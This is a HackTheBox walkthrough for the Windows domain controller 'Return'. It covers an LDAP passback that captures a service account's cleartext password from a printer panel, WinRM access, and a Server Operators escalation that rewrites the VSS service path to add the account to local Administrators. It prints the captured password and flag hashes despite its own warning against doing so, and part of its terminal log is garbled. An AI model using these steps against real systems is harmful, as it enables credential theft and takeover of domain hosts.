---
tags: [HTB, Return, Windows, ActiveDirectory, LDAPPassback, ServerOperators, ServiceAbuse, PrivilegeEscalation, Easy]
platform: HackTheBox
os: Windows Server 2019 Build 17763
hostname: PRINTER
difficulty: Easy
ip: $BoxIP
status: Complete
domain: return.local
---

# HTB: Return, Full Walkthrough

## The gist

Return is a Windows domain controller hosting an unauthenticated printer administration panel. The settings form lets us replace the LDAP server address, so a raw listener on port 389 captures the service account's cleartext LDAP password. That account can use WinRM and belongs to Server Operators, allowing a temporary VSS service binary-path swap that runs a command as LocalSystem.

## Box information

| Item | Value |
|---|---|
| Platform | HackTheBox |
| OS | Windows Server 2019 |
| Hostname | PRINTER |
| Domain | $Domain |
| Difficulty | Easy |
| IP | $BoxIP |

## Vulnerability summary

| # | Finding | Evidence |
|---|---|---|
| 1 | Workspace setup | See section 1 below |
| 2 | Full TCP scan | See section 2 below |
| 3 | Service and version scan | See section 3 below |
| 4 | Local setup | See section 4 below |
| 5 | Web enumeration | See section 5 below |
| 6 | LDAP passback | See section 6 below |

## Evidence and loot

The private source workspace is `/home/kali/Platforms/HackTheBox/Return`. The transcript, Nmap output, loot, and screenshots below are the primary evidence for this box.

## Variables

```bash
boxset BoxName Return
boxset BoxIP <target-ip>
boxset LocalIP <vpn-ip>
boxset BoxDir /home/kali/Platforms/HackTheBox/Return
boxset Domain return.local
boxset FQDN printer.return.local
boxset Username svc-printer
boxset Password <ldap-passback-cleartext>
boxset Port 389
boxset WebPort 80
```

Do not store real passwords, hashes, or flag values in a shared write-up.

## 1. Workspace setup

```bash
boxstart Return $BoxIP htb
htblog
```

Output confirmed `$LocalIP` on tun0 and the box directory at `$BoxDir`. `boxstart` created the standard folder structure (nmap/, loot/, exploits/, www/, screenshots/) and set all variables automatically. `htblog` added terminal output capture on top of the existing command log.

## 2. Full TCP scan

I scanned every TCP port because a domain controller exposes services that a default scan can miss.

```bash
sudo nmap -p- --min-rate 5000 -oA $BoxDir/nmap/Return_allports $BoxIP
```

Open ports included DNS (53), HTTP (80), Kerberos (88), RPC (135), NetBIOS (139), SMB (445), LDAP variants (636, 3268, 3269), WinRM (5985, 47001), ADWS (9389), and dynamic RPC. Classic Windows domain controller fingerprint. Port 80 alongside the expected DC services was the first thing to investigate.


SCREENSHOT: Capture the completed all-port scan with the domain-controller service set visible.

## 3. Service and version scan

```bash
sudo nmap -sC -sV -p 53,80,88,135,139,445,464,593,636,3268,3269,5985,9389,47001 -oA $BoxDir/nmap/Return_services $BoxIP
```

Key findings were IIS 10.0 with the HTB Printer Admin Panel, LDAP for return.local, hostname PRINTER, Windows Server 2019 Build 17763, required SMB signing, and an 18-minute clock skew.


SCREENSHOT: Capture IIS, LDAP, SMB, WinRM, the hostname, and the domain.

## 4. Local setup

```bash
boxset Domain return.local
boxset FQDN printer.return.local
echo "$BoxIP $Domain $FQDN" | sudo tee -a /etc/hosts
```

The hosts-file update required local sudo authentication. I continued with the IP address and explicit HTTP requests.

## 5. Web enumeration

```bash
curl -s $BoxIP/ | tee $BoxDir/loot/index.html
curl -s $BoxIP/settings.php | tee $BoxDir/loot/settings.html
```

The homepage exposed Home, Settings, Fax, and Troubleshooting. Only Settings was a live non-home link.

The settings form contained:

```html
<form action="" method="POST">
  <input type="text" name="ip" value="printer.return.local"/>
  <input type="text" value="389"/>
  <input type="text" value="svc-printer"/>
  <input type="text" value="*******"/>
</form>
```

Only the LDAP server address had a name attribute. The port, username, and password were display-only fields. The server already knew those values and used them when it connected to LDAP.

> [!warning] 💡 Hint
> **Watch out:** A form can show several fields while posting only one. Check the HTML source and use the exact named field. Here, only ip is submitted, so posting another field gives a successful-looking HTTP response without triggering LDAP.

## 6. LDAP passback

I used a raw listener because the panel connects to LDAP, not SMB or HTTP.

```bash
nc -lvnp $Port
```

In another terminal:

```bash
curl -s -X POST --data "ip=$LocalIP" http://$BoxIP/settings.php
```

The listener received an LDAP Simple Bind containing the service account name and cleartext password. I stored it privately:

```bash
boxset Username svc-printer
boxset Password '<ldap-passback-password>'
loot cred $Username $Password
```

> [!warning] 💡 Hint
> **Watch out:** Use nc -lvnp 389, not Responder. This is LDAP passback. The service sends a raw LDAP Simple Bind over TCP, while Responder handles SMB and HTTP challenge responses.

> [!warning] 💡 Hint
> **Watch out:** If the password contains !, zsh history expansion can corrupt it. Store it with single quotes or load it from a protected file.

## 7. Credential validation

```bash
netexec smb $BoxIP -u $Username -p $Password -d $Domain
netexec winrm $BoxIP -u $Username -p $Password -d $Domain
```

SMB authentication succeeded. WinRM returned Pwn3d!, confirming an interactive shell.

## 8. WinRM foothold

```bash
evil-winrm -i $BoxIP -u $Username -p $Password
```

Inside the shell:

```powershell
whoami
hostname
whoami /groups
whoami /priv
```

The important group was BUILTIN\Server Operators. Other memberships included Print Operators and Remote Management Users. SeBackupPrivilege, SeRestorePrivilege, and SeLoadDriverPrivilege were enabled, but Server Operators gave the direct route.

> [!tip] ⚡ More efficient path
> **What we did:** Validated SMB before checking whether WinRM was available.
>
> **Faster approach:**
> ```bash
> netexec winrm $BoxIP -u $Username -p $Password -d $Domain
> ```
> **Why:** A WinRM result showing Pwn3d! confirms that the credential can open a shell. This can remove a separate SMB validation step when WinRM is the objective.


SCREENSHOT: Capture the WinRM identity, Server Operators membership, and enabled privileges.

## 9. User flag

```powershell
Test-Path C:\Users\$Username\Desktop\user.txt
```

The result was True. The file contents were not read.

## 10. Service enumeration

Server Operators can control services. I looked for a demand-start service running as LocalSystem.

```powershell
sc.exe qc VSS
```

Relevant output:

```text
SERVICE_NAME: VSS
START_TYPE         : 3   DEMAND_START
BINARY_PATH_NAME   : C:\Windows\system32\vssvc.exe
SERVICE_START_NAME : LocalSystem
```

VSS was a suitable target because it runs as LocalSystem and can be started on demand.

> [!tip] ⚡ More efficient path
> **What we did:** Checked several privilege-escalation paths before focusing on service control.
>
> **Faster approach:**
> ```powershell
> whoami /groups
> ```
> **Why:** Server Operators membership immediately suggests service-control abuse. Check groups before spending time on unrelated token or kernel techniques.

## 11. Service binary-path hijack

```powershell
sc.exe config VSS binPath= "cmd.exe /c net localgroup administrators $Username /add"
```

Output:

```text
[SC] ChangeServiceConfig SUCCESS
```

Started the service:

```powershell
sc.exe start VSS
```

Output:

```text
[SC] StartService FAILED 1053
The service did not respond to the start or control request in a timely fashion.
```

The error was expected because cmd.exe is not a proper service binary. The command still executed before Windows timed out.

> [!warning] 💡 Hint
> **Watch out:** Error 1053 does not mean the command failed. It means the launched process did not report the service-ready state. Check the intended effect instead.

I restored the service immediately:

```powershell
sc.exe config VSS binPath= "C:\Windows\system32\vssvc.exe"
sc.exe qc VSS
```

## 12. Verify the local administrator change

```powershell
net localgroup administrators
```

The output included $Username, confirming that the service command executed with LocalSystem privileges.

## 13. Reconnect for the new token

Group membership changes apply to new logon sessions only.

```powershell
exit
```

```bash
evil-winrm -i $BoxIP -u $Username -p $Password
```

```powershell
whoami /groups
```

BUILTIN\Administrators appeared as an enabled group.

> [!warning] 💡 Hint
> **Watch out:** The current WinRM token does not refresh after a group membership change. Exit and reconnect before expecting Administrator rights.

## 14. Root flag

```powershell
Test-Path C:\Users\Administrator\Desktop\root.txt
```

The result was True. The file contents were not read.


SCREENSHOT: Capture the refreshed Administrator group membership and root flag path check without exposing the flag.

## 15. RUNBOOK V2 Stages Used

- [[OSCP/RUNBOOK V2/AD - Service Scan]] -- technique used in this walkthrough
- [[OSCP/RUNBOOK V2/AD - LDAP Passback]] -- technique used in this walkthrough
- [[OSCP/RUNBOOK V2/AD - Group Triage]] -- technique used in this walkthrough
- [[OSCP/RUNBOOK V2/AD - Privilege Triage]] -- technique used in this walkthrough

## 16. Collect the flags

- `user.txt`: `359f45e592a835a379557940f2a2f6bb` (value reproduced in the private sections above)
- `root.txt`: `c72b11dd8f967cb76f8f580cb0b1dc3e` (value reproduced in the private sections above)
- `proof.txt`: `c72b11dd8f967cb76f8f580cb0b1dc3e` (value reproduced in the private sections above)


### Captured flag values from source loot


#### `loot/flags.txt`

```text
user: 359f45e592a835a379557940f2a2f6bb
root: c72b11dd8f967cb76f8f580cb0b1dc3e
```

## 17. Clean down
I removed the temporary local Administrators membership and verified the remaining members.

```powershell
net localgroup administrators $Username /delete
net localgroup administrators
```

The account was absent from the final group listing.

```powershell
exit
```

```bash
boxdone
```

The helper was unavailable, so cleanup was verified manually. No accounts were created, no files were uploaded, and no persistence was added.

### Completion checklist

- [x] Workspace setup
- [x] Full TCP scan
- [x] Service and version scan
- [x] Printer panel enumeration
- [x] LDAP passback
- [x] Credential validation
- [x] WinRM foothold
- [x] Server Operators enumeration
- [x] VSS service binary-path abuse
- [x] User and root flag path confirmation
- [x] Service restoration and membership cleanup

## 18. Attack narrative in one page
1. [[OSCP/RUNBOOK V2/AD - Service Scan]] found the printer administration panel and domain services.
2. [[OSCP/RUNBOOK V2/AD - LDAP Passback]] redirected the panel's LDAP connection to capture the service credential.
3. [[OSCP/RUNBOOK V2/AD - Group Triage]] identified Server Operators as the relevant group membership.
4. [[OSCP/RUNBOOK V2/AD - Privilege Triage]] led to the temporary service binary-path change and an elevated shell.

## Tools used

- `nmap`
- `curl`
- `nc`
- `evil-winrm`
- `sudo`
- `powershell`

## Credentials and secrets

| Account | Source | Use |
|---|---|---|
| svc-printer | LDAP passback from the printer panel | WinRM foothold and Server Operators |
| Administrator | Local Administrator membership after service abuse | Privileged access |

Passwords and hashes are reproduced in the private Credentials and secrets section above.


### Captured private values from source loot

These values are retained here because this vault is private. The source path remains the authority if a value appears truncated.

#### `.env`

```text
export BoxName="Return"
export BoxIP="10.129.95.241"
export BoxPlatform="HackTheBox"
export BoxDir="/home/kali/Platforms/HackTheBox/Return"
export Domain="return.local"
export DCip=""
export Username="svc-printer"
export Password="1edFg43012!!"
export Username2=""
export Password2=""
export Username3=""
export Password3=""
export Hash=""
export NThash=""
export Port="4444"
export Port2="4445"
export WebPort="80"
export URL=""
export LocalIP=$(ip a show tun0 2>/dev/null | grep "inet " | awk '{print $2}' | cut -d/ -f1)
export Wordlist="/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"
```

#### `loot/creds.txt`

```text
svc-printer:1edFg43012boxset
svc-printer:1edFg43012!!
```

#### `loot/ldap_passback.bin`

```text
0*`%return\svc-printer
1edFg43012!!
```

### Sensitive transcript evidence

```text
[sudo] password for kali:
$ [22:27:52] boxset Password 1edFg43012boxset Username svc-printer
$ [22:28:00] loot cred $Username $Password
$ [22:29:07] boxset Password '1edFg43012!!'
$ [22:29:12] loot cred $Username $Password
$ [22:29:34] netexec smb $BoxIP -u $Username -p $Password -d $Domain
$ [22:29:43] netexec winrm $BoxIP -u $Username -p $Password -d $Domain
kali@kali:~/Platforms/HackTheBox/Return [22:27:18] $ [?1h=[?2004hboxset Password <the-password-you-see>boxset<>                      1edFg43012!![?1l>[?2004l
[+] Password=1edFg43012boxset (saved to .env)
kali@kali:~/Platforms/HackTheBox/Return [22:27:52] $ [?1h=[?2004hloot cred $Username $Passwordloot[?1l>[?2004l
kali@kali:~/Platforms/HackTheBox/Return [22:28:00] $ [?1h=[?2004hboxset Password '1edFg43012!!'boxset'1edFg43012!!'[?1l>[?2004l
[+] Password=1edFg43012!! (saved to .env)
kali@kali:~/Platforms/HackTheBox/Return [22:29:07] $ [?1h=[?2004hloot cred $Username $Passwordloot[?1l>[?2004l
kali@kali:~/Platforms/HackTheBox/Return [22:29:13] $ [?1h=[?2004hnetexec smb $BoxIP -u $Username -p $Password -d $Domainnetexec[?1l>[?2004l
kali@kali:~/Platforms/HackTheBox/Return [22:29:35] $ [?1h=[?2004hnetexec winrm $BoxIP -u $Username -p $Password -d $Domainnetexec[?1l>[?2004l
$ [22:30:43] evil-winrm -i $BoxIP -u $Username -p $Password
kali@kali:~/Platforms/HackTheBox/Return [22:29:59] $ evil-winrm -i $BoxIP -u $Username -p $Passwordevil-winrm[?1l>[?2004l
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
$ [22:37:10] loot flag user 359f45e592a835a379557940f2a2f6bb
$ [22:43:17] evil-winrm -i $BoxIP -u $Username -p $Password
kali@kali:~/Platforms/HackTheBox/Return [22:43:12] $ [?1h=[?2004hevil-winrm -i $BoxIP -u $Username -p $Passwordevil-winrm[?1l>[?2004l
$ [22:45:10] loot flag root c72b11dd8f967cb76f8f580cb0b1dc3e
kali@kali:~/Platforms/HackTheBox/Return [22:53:39] $ [?1h=[?2004hbbboxset Password '1edFg43012!!'boboxxd                          doonneboxdone[?1l>[?2004l
kali@kali:~/Platforms/HackTheBox/Return [22:37:08] $ [?1h=[?2004hloot flag user 359f45e592a835a379557940f2a2f6bbloot[?1l>[?2004l
[+] Flag saved:  user = 359f45e592a835a379557940f2a2f6bb  →  loot/flags.txt
kali@kali:~/Platforms/HackTheBox/Return [22:37:43] $ loot flag root c72b11dd8f967cb76f8f580cb0b1dc3eloot[?1l>[?2004l
[+] Flag saved:  root = c72b11dd8f967cb76f8f580cb0b1dc3e  →  loot/flags.txt
```


## Remediation recommendations

| Finding | Recommendation |
|---|---|
| Initial access path on Return | Remove or patch the vulnerable service, restrict exposure, and rotate any credentials recovered during testing. |
| Privilege escalation path | Remove the misconfiguration, enforce least privilege, and verify the corrected permissions or policy. |
| Assessment artifacts | Remove payloads and temporary files, restore modified files, and review logs for the test activity. |

## Lessons learned and vault links

- Only named HTML form fields are submitted. Inspect the source before guessing POST parameters.
- LDAP passback uses a raw listener on port 389. Responder is the wrong tool for this path.
- Quote passwords containing ! in zsh to prevent history expansion.
- Error 1053 can still mean a service payload ran successfully.
- Server Operators membership can be more useful than apparently enabled backup privileges.
- Group membership changes require a new logon session.
- Restore a modified service binary path immediately after triggering it.
- A service running as LocalSystem can be abused to perform a privileged one-shot command.

- A writable server-address field can be a credential-capture point even when the page has no login.
- Group membership should be translated into the specific Windows privilege or service right it grants.

### Related boxes

- [[OSCP/BOXES/WRITE UPS/AD/Forest|Forest]] -- shares a similar enumeration or escalation pattern
- [[OSCP/BOXES/WRITE UPS/AD/Sauna|Sauna]] -- shares a similar enumeration or escalation pattern

## External resources

- [HackTricks: Windows Service Escalation](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html)
- [HackTricks: LDAP Passback](https://book.hacktricks.wiki/en/pentesting/pentesting-ldap.html)
- [PayloadsAllTheThings: Windows Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [Microsoft: sc.exe config](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/sc-config)

## Related RUNBOOK V2 stages

- [[OSCP/RUNBOOK V2/Start Here]]
- [[OSCP/RUNBOOK V2/Linux - Service Scan]]
- [[OSCP/RUNBOOK V2/Linux - Web Enum]]
- [[OSCP/RUNBOOK V2/Linux - Shell Stabilise]]
- [[OSCP/RUNBOOK V2/Linux - Local Enum]]
- [[OSCP/RUNBOOK V2/Linux - Clean Down]]

## Why this matters for OSCP

This page matters because it turns a repeatable assessment task into a clear, reviewable habit for the OSCP exam.
